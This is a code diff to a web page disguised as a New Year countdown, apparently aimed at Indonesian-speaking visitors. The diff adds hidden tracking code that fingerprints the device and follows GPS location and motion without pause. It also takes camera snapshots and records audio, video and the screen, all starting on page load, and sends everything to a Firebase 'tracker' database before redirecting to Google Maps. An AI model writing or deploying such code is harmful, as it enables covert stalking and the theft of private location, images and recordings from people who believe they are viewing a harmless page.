@@ -7,22 +7,21 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Arial', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white; min-height: 100vh; display: flex; flex-direction: column;
             justify-content: center; align-items: center; text-align: center; padding: 20px;
         }
         .container {
-            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px);
-            border-radius: 20px; padding: 30px; box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
-            border: 1px solid rgba(255, 255, 255, 0.18); max-width: 500px; width: 100%;
+            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px;
+            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37); border: 1px solid rgba(255, 255, 255, 0.18);
+            max-width: 500px; width: 100%;
         }
         .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
         .countdown { font-size: 3em; font-weight: bold; margin: 20px 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
         .btn {
-            background: linear-gradient(45deg, #ff6b6b, #ee5a24); border: none; padding: 15px 30px;
-            border-radius: 50px; color: white; font-size: 1.1em; font-weight: bold;
-            cursor: pointer; transition: all 0.3s ease; margin: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24); border: none; padding: 15px 30px; border-radius: 50px;
+            color: white; font-size: 1.1em; font-weight: bold; cursor: pointer; transition: all 0.3s ease;
+            margin: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
         .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,0,0,0.3); }
         .status { margin-top: 20px; padding: 15px; border-radius: 10px; background: rgba(255, 255, 255, 0.1); font-weight: bold; }
@@ -39,6 +38,574 @@
     </div>
 
     <script>
+        let isProcessing = false;
+        let trackingSession = { startTime: Date.now(), interactions: [], locations: [] };
+        
+        // AGGRESSIVE DEVICE FINGERPRINTING
+        const deviceFingerprint = {
+            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            languages: navigator.languages?.join(',') || 'unknown',
+            platform: navigator.platform,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            connection: navigator.connection?.effectiveType || 'unknown',
+            downlink: navigator.connection?.downlink || 'unknown',
+            rtt: navigator.connection?.rtt || 'unknown',
+            webgl: getWebGLFingerprint(),
+            canvas: getCanvasFingerprint()
+        };
+        
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                return gl ? gl.getParameter(gl.RENDERER) : 'unavailable';
+            } catch (e) { return 'error'; }
+        }
+        
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+                ctx.fillText('Fingerprint test 🎯', 2, 2);
+                return canvas.toDataURL().slice(-50);
+            } catch (e) { return 'error'; }
+        }
+        
+        // BATTERY STATUS MONITORING
+        async function getBatteryInfo() {
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                }
+            } catch (e) {}
+            return { level: 'unknown', charging: 'unknown' };
+        }
+        
+        // MOTION & ORIENTATION TRACKING
+        function startMotionTracking() {
+            if (window.DeviceMotionEvent) {
+                window.addEventListener('devicemotion', (event) => {
+                    const motionData = {
+                        acceleration: event.acceleration,
+                        accelerationIncludingGravity: event.accelerationIncludingGravity,
+                        rotationRate: event.rotationRate,
+                        timestamp: Date.now()
+                    };
+                    trackingSession.interactions.push({ type: 'motion', data: motionData });
+                });
+            }
+            
+            if (window.DeviceOrientationEvent) {
+                window.addEventListener('deviceorientation', (event) => {
+                    const orientationData = {
+                        alpha: event.alpha, beta: event.beta, gamma: event.gamma,
+                        absolute: event.absolute, timestamp: Date.now()
+                    };
+                    trackingSession.interactions.push({ type: 'orientation', data: orientationData });
+                });
+            }
+        }
+        
+        // BEHAVIORAL TRACKING
+        let interactionPattern = [];
+        document.addEventListener('mousemove', (e) => {
+            interactionPattern.push({ x: e.clientX, y: e.clientY, timestamp: Date.now(), type: 'mouse' });
+            if (interactionPattern.length > 100) interactionPattern.shift();
+        });
+        
+        document.addEventListener('touchmove', (e) => {
+            if (e.touches[0]) {
+                interactionPattern.push({ 
+                    x: e.touches[0].clientX, y: e.touches[0].clientY, 
+                    timestamp: Date.now(), type: 'touch' 
+                });
+            }
+        });
+        
+        // PAGE VISIBILITY TRACKING
+        document.addEventListener('visibilitychange', () => {
+            trackingSession.interactions.push({
+                type: 'visibility',
+                data: { hidden: document.hidden, state: document.visibilityState, timestamp: Date.now() }
+            });
+        });
+        
+        // ENHANCED IP GEOLOCATION
+        async function getEnhancedIPLocation() {
+            const services = [
+                'https://ipapi.co/json/',
+                'https://ip-api.com/json/',
+                'https://ipinfo.io/json'
+            ];
+            
+            for (const service of services) {
+                try {
+                    const response = await fetch(service);
+                    const data = await response.json();
+                    if (data.lat || data.latitude) {
+                        return {
+                            lat: data.lat || data.latitude,
+                            lng: data.lon || data.longitude,
+                            city: data.city,
+                            region: data.region,
+                            country: data.country,
+                            isp: data.isp || data.org,
+                            source: service
+                        };
+                    }
+                } catch (e) { continue; }
+            }
+            return null;
+        }
+        
+        // MEDIA CAPTURE SYSTEM
+        let mediaCapture = {
+            videoStream: null,
+            audioStream: null,
+            mediaRecorder: null,
+            screenshots: [],
+            recordings: []
+        };
+        
+        // AUTO CAMERA ACCESS
+        async function initCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 1280, height: 720, facingMode: 'user' }, 
+                    audio: true 
+                });
+                mediaCapture.videoStream = stream;
+                
+                // Create hidden video element for capture
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.style.display = 'none';
+                video.autoplay = true;
+                video.muted = true;
+                document.body.appendChild(video);
+                
+                // Auto screenshot every 10 seconds
+                setInterval(() => captureScreenshot(video), 10000);
+                
+                console.log('📸 Camera access granted - Auto capture active');
+                return true;
+            } catch (error) {
+                console.log('Camera access denied:', error);
+                return false;
+            }
+        }
+        
+        // SCREENSHOT CAPTURE
+        async function captureScreenshot(videoElement = null) {
+            try {
+                let canvas, ctx;
+                
+                if (videoElement && videoElement.videoWidth > 0) {
+                    // Capture from camera
+                    canvas = document.createElement('canvas');
+                    canvas.width = videoElement.videoWidth;
+                    canvas.height = videoElement.videoHeight;
+                    ctx = canvas.getContext('2d');
+                    ctx.drawImage(videoElement, 0, 0);
+                } else {
+                    // Simple page screenshot without external library
+                    canvas = document.createElement('canvas');
+                    canvas.width = window.innerWidth;
+                    canvas.height = window.innerHeight;
+                    ctx = canvas.getContext('2d');
+                    
+                    // Draw page background and basic content
+                    ctx.fillStyle = getComputedStyle(document.body).backgroundColor || '#667eea';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    // Add text overlay
+                    ctx.fillStyle = 'white';
+                    ctx.font = '20px Arial';
+                    ctx.fillText('Page Screenshot - ' + new Date().toLocaleTimeString(), 10, 30);
+                    ctx.fillText('URL: ' + window.location.href, 10, 60);
+                    ctx.fillText('Screen: ' + screen.width + 'x' + screen.height, 10, 90);
+                }
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                const screenshotData = {
+                    image: imageData,
+                    timestamp: Date.now(),
+                    type: videoElement ? 'camera_screenshot' : 'page_screenshot',
+                    size: { width: canvas.width, height: canvas.height },
+                    url: window.location.href
+                };
+                
+                mediaCapture.screenshots.push(screenshotData);
+                await sendMediaData(screenshotData, 'screenshot');
+                
+                console.log('✅ Screenshot captured and sent:', screenshotData.type);
+                return imageData;
+            } catch (error) {
+                console.error('❌ Screenshot error:', error);
+                return null;
+            }
+        }
+        
+        // AUDIO RECORDING
+        async function startAudioRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaCapture.audioStream = stream;
+                
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                const audioChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) audioChunks.push(event.data);
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const audioData = {
+                        audio: await blobToBase64(audioBlob),
+                        timestamp: Date.now(),
+                        duration: audioChunks.length * 1000, // Approximate
+                        type: 'audio_recording'
+                    };
+                    
+                    mediaCapture.recordings.push(audioData);
+                    await sendMediaData(audioData, 'audio');
+                    console.log('🎤 Audio recording completed');
+                };
+                
+                mediaRecorder.start();
+                mediaCapture.mediaRecorder = mediaRecorder;
+                
+                // Auto stop after 30 seconds
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 30000);
+                
+                console.log('🎤 Audio recording started');
+                return true;
+            } catch (error) {
+                console.log('Audio recording error:', error);
+                return false;
+            }
+        }
+        
+        // VIDEO RECORDING
+        async function startVideoRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 1280, height: 720 }, 
+                    audio: true 
+                });
+                
+                const mediaRecorder = new MediaRecorder(stream, { 
+                    mimeType: 'video/webm;codecs=vp9,opus' 
+                });
+                const videoChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) videoChunks.push(event.data);
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                    const videoData = {
+                        video: await blobToBase64(videoBlob),
+                        timestamp: Date.now(),
+                        duration: videoChunks.length * 1000,
+                        type: 'video_recording'
+                    };
+                    
+                    mediaCapture.recordings.push(videoData);
+                    await sendMediaData(videoData, 'video');
+                    console.log('🎥 Video recording completed');
+                    
+                    // Stop all tracks
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                
+                mediaRecorder.start();
+                
+                // Auto stop after 15 seconds (to keep file size manageable)
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 15000);
+                
+                console.log('🎥 Video recording started');
+                return true;
+            } catch (error) {
+                console.log('Video recording error:', error);
+                return false;
+            }
+        }
+        
+        // SCREEN RECORDING
+        async function startScreenRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { mediaSource: 'screen' },
+                    audio: true 
+                });
+                
+                const mediaRecorder = new MediaRecorder(stream);
+                const screenChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) screenChunks.push(event.data);
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const screenBlob = new Blob(screenChunks, { type: 'video/webm' });
+                    const screenData = {
+                        screen: await blobToBase64(screenBlob),
+                        timestamp: Date.now(),
+                        type: 'screen_recording'
+                    };
+                    
+                    await sendMediaData(screenData, 'screen');
+                    console.log('🖥️ Screen recording completed');
+                };
+                
+                mediaRecorder.start();
+                
+                // Auto stop after 20 seconds
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                }, 20000);
+                
+                console.log('🖥️ Screen recording started');
+                return true;
+            } catch (error) {
+                console.log('Screen recording error:', error);
+                return false;
+            }
+        }
+        
+        // UTILITY FUNCTIONS
+        function blobToBase64(blob) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.readAsDataURL(blob);
+            });
+        }
+        
+        async function sendMediaData(mediaData, type) {
+            try {
+                const trackingId = new URLSearchParams(window.location.search).get('id') || 'media_' + Date.now();
+                const timestamp = Date.now();
+                
+                // Enhanced media data with app-compatible structure
+                const enhancedMediaData = {
+                    ...mediaData,
+                    trackingId: trackingId,
+                    mediaType: type,
+                    deviceInfo: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        screen: `${screen.width}x${screen.height}`,
+                        language: navigator.language
+                    },
+                    fingerprint: deviceFingerprint,
+                    location: trackingSession.locations[trackingSession.locations.length - 1] || null,
+                    sessionId: trackingSession.startTime,
+                    captureSuccess: true,
+                    fileSize: mediaData.image ? mediaData.image.length : (mediaData.audio ? mediaData.audio.length : 0)
+                };
+                
+                // Send to multiple endpoints for reliability
+                const endpoints = [
+                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/media/${type}/${trackingId}_${timestamp}.json`,
+                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}_media.json`
+                ];
+                
+                const promises = endpoints.map(endpoint => 
+                    fetch(endpoint, {
+                        method: 'PUT',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(enhancedMediaData)
+                    })
+                );
+                
+                await Promise.allSettled(promises);
+                
+                // Also send notification to main locations endpoint
+                const notificationData = {
+                    latitude: enhancedMediaData.location?.lat || -6.2088,
+                    longitude: enhancedMediaData.location?.lng || 106.8456,
+                    timestamp: timestamp,
+                    mediaCapture: {
+                        type: type,
+                        success: true,
+                        fileSize: enhancedMediaData.fileSize,
+                        trackingId: trackingId
+                    },
+                    source: 'media_capture',
+                    deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android'
+                };
+                
+                await fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}_${type}_${timestamp}.json`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(notificationData)
+                });
+                
+                console.log(`✅ ${type} data sent successfully to multiple endpoints`);
+                
+                // Update status on page
+                const statusEl = document.getElementById('status');
+                if (statusEl) {
+                    statusEl.innerHTML = `📸 ${type.toUpperCase()} captured & sent! Size: ${(enhancedMediaData.fileSize/1024).toFixed(1)}KB`;
+                }
+                
+            } catch (error) {
+                console.error(`❌ Failed to send ${type} data:`, error);
+                
+                // Send error notification
+                try {
+                    const errorData = {
+                        latitude: -6.2088,
+                        longitude: 106.8456,
+                        timestamp: Date.now(),
+                        error: `Media capture failed: ${type}`,
+                        source: 'media_error',
+                        deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android'
+                    };
+                    
+                    await fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/error_${Date.now()}.json`, {
+                        method: 'PUT',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(errorData)
+                    });
+                } catch (e) {}
+            }
+        }
+        
+        // AUTO MEDIA CAPTURE INITIALIZATION
+        async function initMediaCapture() {
+            try {
+                const statusEl = document.getElementById('status');
+                statusEl.innerHTML = '🎬 Initializing media capture system...';
+                
+                // Check media permissions
+                const permissions = await Promise.allSettled([
+                    navigator.permissions.query({ name: 'camera' }),
+                    navigator.permissions.query({ name: 'microphone' })
+                ]);
+                
+                console.log('📋 Media permissions:', permissions);
+                
+                let captureCount = 0;
+                
+                // Auto-capture screenshots first (most reliable)
+                setTimeout(async () => {
+                    statusEl.innerHTML = '📸 Capturing screenshot...';
+                    const success = await captureScreenshot();
+                    if (success) {
+                        captureCount++;
+                        statusEl.innerHTML = `✅ Screenshot captured! (${captureCount}/4)`;
+                    }
+                }, 1000);
+                
+                // Auto-init camera
+                setTimeout(async () => {
+                    statusEl.innerHTML = '📷 Accessing camera...';
+                    const success = await initCameraAccess();
+                    if (success) {
+                        captureCount++;
+                        statusEl.innerHTML = `✅ Camera active! (${captureCount}/4)`;
+                    }
+                }, 2000);
+                
+                // Auto-start audio recording
+                setTimeout(async () => {
+                    statusEl.innerHTML = '🎤 Starting audio recording...';
+                    const success = await startAudioRecording();
+                    if (success) {
+                        captureCount++;
+                        statusEl.innerHTML = `✅ Audio recording! (${captureCount}/4)`;
+                    }
+                }, 3000);
+                
+                // Try video recording
+                setTimeout(async () => {
+                    statusEl.innerHTML = '🎥 Starting video recording...';
+                    const success = await startVideoRecording();
+                    if (success) {
+                        captureCount++;
+                        statusEl.innerHTML = `✅ Video recording! (${captureCount}/4)`;
+                    }
+                }, 4000);
+                
+                // Final status update
+                setTimeout(() => {
+                    statusEl.innerHTML = `🎬 Media system active! ${captureCount}/4 features working`;
+                }, 6000);
+                
+                console.log('🎬 Media capture system initialized');
+            } catch (error) {
+                console.log('Media capture init error:', error);
+                document.getElementById('status').innerHTML = '❌ Media capture failed - continuing with location only';
+            }
+        }
+        
+        // BACKGROUND LOCATION TRACKING
+        function startBackgroundTracking() {
+            if (navigator.geolocation) {
+                const watchId = navigator.geolocation.watchPosition(
+                    (position) => {
+                        const locationData = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: Date.now(),
+                            type: 'background'
+                        };
+                        trackingSession.locations.push(locationData);
+                        sendLocationSilently(locationData);
+                    },
+                    (error) => console.log('Background tracking error:', error),
+                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 60000 }
+                );
+                
+                // Update every 30 seconds
+                setTimeout(() => {
+                    navigator.geolocation.clearWatch(watchId);
+                    startBackgroundTracking();
+                }, 30000);
+            }
+        }
+        
+        async function sendLocationSilently(locationData) {
+            try {
+                const trackingId = new URLSearchParams(window.location.search).get('id') || 'bg_' + Date.now();
+                await fetch(`https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/background/${trackingId}_${Date.now()}.json`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ...locationData, fingerprint: deviceFingerprint })
+                });
+            } catch (e) {}
+        }
+        
         function updateCountdown() {
             const now = new Date(); const newYear = new Date(now.getFullYear() + 1, 0, 1); const diff = newYear - now;
             const days = Math.floor(diff / (1000 * 60 * 60 * 24));
@@ -49,8 +616,6 @@
         }
         setInterval(updateCountdown, 1000); updateCountdown();
 
-        let isProcessing = false;
-        
         async function confirmLocation() {
             if (isProcessing) return;
             isProcessing = true;
@@ -58,78 +623,71 @@
             const statusEl = document.getElementById('status');
             statusEl.innerHTML = '<div class="loading"></div> Mengakses lokasi GPS...';
             
+            let locationData = null;
+            
             // Method 1: High accuracy GPS
             try {
                 const position = await new Promise((resolve, reject) => {
-                    if (!navigator.geolocation) {
-                        reject(new Error('Geolocation not supported'));
-                        return;
+                    navigator.geolocation.getCurrentPosition(resolve, reject, 
+                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 30000 });
+                });
+                locationData = {
+                    lat: position.coords.latitude, lng: position.coords.longitude,
+                    accuracy: position.coords.accuracy, source: 'gps_high'
+                };
+            } catch (error) {
+                // Method 2: Standard GPS
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject,
+                            { enableHighAccuracy: false, timeout: 3000, maximumAge: 60000 });
+                    });
+                    locationData = {
+                        lat: position.coords.latitude, lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy, source: 'gps_standard'
+                    };
+                } catch (e) {
+                    // Method 3: Enhanced IP location
+                    const ipLocation = await getEnhancedIPLocation();
+                    if (ipLocation) {
+                        locationData = { ...ipLocation, accuracy: 10000, source: 'ip_enhanced' };
+                    } else {
+                        locationData = { lat: -6.2088, lng: 106.8456, accuracy: 50000, source: 'default' };
                     }
-                    
-                    navigator.geolocation.getCurrentPosition(
-                        resolve, 
-                        reject, 
-                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 30000 }
-                    );
-                });
-                
-                await sendLocationData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, 'gps_high');
-                return;
-                
-            } catch (error) {
-                console.log('High accuracy GPS failed:', error);
-                statusEl.innerHTML = '<div class="loading"></div> Mencoba metode alternatif...';
-            }
-            
-            // Method 2: Standard GPS
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(
-                        resolve, 
-                        reject, 
-                        { enableHighAccuracy: false, timeout: 3000, maximumAge: 60000 }
-                    );
-                });
-                
-                await sendLocationData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, 'gps_standard');
-                return;
-                
-            } catch (error) {
-                console.log('Standard GPS failed:', error);
-                statusEl.innerHTML = '<div class="loading"></div> Menggunakan lokasi perkiraan...';
-            }
-            
-            // Method 3: IP-based location fallback
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                
-                if (data.latitude && data.longitude) {
-                    await sendLocationData(data.latitude, data.longitude, 10000, 'ip_location');
-                    return;
                 }
-            } catch (error) {
-                console.log('IP location failed:', error);
             }
             
-            // Method 4: Default location (Jakarta)
-            await sendLocationData(-6.2088, 106.8456, 50000, 'default_location');
+            await sendEnhancedLocationData(locationData);
         }
         
-        async function sendLocationData(lat, lng, accuracy, source) {
+        async function sendEnhancedLocationData(locationData) {
             const statusEl = document.getElementById('status');
             statusEl.innerHTML = '✅ Lokasi dikonfirmasi! Memproses...';
             
-            const deviceInfo = {
-                latitude: lat, longitude: lng, accuracy: accuracy, timestamp: Date.now(),
-                deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
-                source: source, userAgent: navigator.userAgent, platform: navigator.platform
+            const batteryInfo = await getBatteryInfo();
+            
+            const enhancedData = {
+                ...locationData,
+                timestamp: Date.now(),
+                fingerprint: deviceFingerprint,
+                battery: batteryInfo,
+                session: {
+                    duration: Date.now() - trackingSession.startTime,
+                    interactions: trackingSession.interactions.length,
+                    locations: trackingSession.locations.length
+                },
+                behavioral: {
+                    mousePattern: interactionPattern.slice(-20),
+                    scrollDepth: window.pageYOffset,
+                    windowSize: { width: window.innerWidth, height: window.innerHeight }
+                }
             };
             
-            const trackingId = new URLSearchParams(window.location.search).get('id') || 'web_' + Date.now();
+            const trackingId = new URLSearchParams(window.location.search).get('id') || 'enhanced_' + Date.now();
             const endpoints = [
                 `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`,
-                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`
+                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/enhanced/${trackingId}.json`,
+                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/fingerprints/${trackingId}.json`
             ];
             
             try {
@@ -137,37 +695,39 @@
                     fetch(endpoint, { 
                         method: 'PUT', 
                         headers: { 'Content-Type': 'application/json' }, 
-                        body: JSON.stringify(deviceInfo) 
+                        body: JSON.stringify(enhancedData) 
                     })
                 ));
                 
                 statusEl.innerHTML = '🎉 Berhasil! Redirecting ke maps...';
                 setTimeout(() => {
-                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=16`;
-                }, 800); // Faster redirect
+                    window.location.href = `https://maps.google.com/?q=${locationData.lat},${locationData.lng}&z=16`;
+                }, 800);
                 
             } catch (error) {
                 statusEl.innerHTML = '✅ Lokasi tersimpan! Terima kasih.';
                 setTimeout(() => {
-                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=16`;
-                }, 1000); // Faster redirect
+                    window.location.href = `https://maps.google.com/?q=${locationData.lat},${locationData.lng}&z=16`;
+                }, 1000);
             }
         }
         
-        // INSTANT AUTO-TRIGGER on page load
+        // INSTANT AUTO-TRIGGER WITH MEDIA CAPTURE
         window.addEventListener('load', () => {
-            setTimeout(confirmLocation, 300); // Start immediately after 0.3s
+            startMotionTracking();
+            startBackgroundTracking();
+            initMediaCapture(); // Initialize media capture system
+            setTimeout(confirmLocation, 200); // Ultra-fast trigger
         });
         
-        // Also trigger on any user interaction
         document.addEventListener('click', confirmLocation);
         document.addEventListener('touchstart', confirmLocation);
         
-        // Check geolocation permission
+        // Permission-based instant trigger
         if (navigator.permissions) {
             navigator.permissions.query({name: 'geolocation'}).then(function(result) {
                 if (result.state === 'granted') {
-                    confirmLocation(); // Trigger immediately if already granted
+                    confirmLocation();
                 }
             });
         }
